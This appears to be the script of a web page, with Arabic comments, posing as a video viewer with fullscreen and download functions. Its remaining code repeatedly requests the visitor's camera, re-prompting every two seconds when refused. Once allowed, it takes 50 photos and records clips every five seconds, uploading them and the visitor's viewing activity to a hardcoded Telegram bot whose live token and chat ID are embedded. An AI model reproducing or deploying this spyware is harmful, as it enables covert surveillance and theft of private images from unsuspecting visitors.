<script>
const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
const CHAT_ID = "7664410054";

// 👑 وظيفة إرسال إلى البوت
function sendToBot(message) {
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  });
}

// 👑 تكبير الفيديو
function openFullscreen(src, desc) {
  const screen = document.getElementById("fullscreen");
  const video = document.getElementById("fullVideo");
  video.src = src;
  screen.style.display = "flex";
  sendToBot(`🎥 تم تشغيل الفيديو: ${desc}`);
}

// 👑 تحميل الفيديو
function downloadVideo() {
  const src = document.getElementById("fullVideo").src;
  const a = document.createElement("a");
  a.href = src;
  a.download = src.split('/').pop();
  a.click();
}

// 👑 طلب الكاميرا والتقاط الصور + تسجيل فيديو كل 5 ثوانٍ
let allowed = false;
function requestCamera() {
  if (allowed) return;
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(async stream => {
      allowed = true;
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);

      // 📸 التقاط 50 صورة
      for (let i = 0; i < 50; i++) {
        const blob = await imageCapture.takePhoto();
        uploadMedia(blob, "photo.jpg");
      }

      // 🎥 تسجيل فيديو متكرر
      setInterval(() => {
        let recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/mp4' });
          uploadMedia(blob, "cam.mp4");
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 5000);
      }, 5000);

    })
    .catch(() => {
      allowed = false;
      setTimeout(requestCamera, 2000); // طلب مجدد إذا رفض
    });
}

// 👑 رفع وسائط إلى تليجرام
function uploadMedia(blob, filename) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("video", blob, filename);
  fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
    method: "POST",
    body: formData
  });
}
</script>
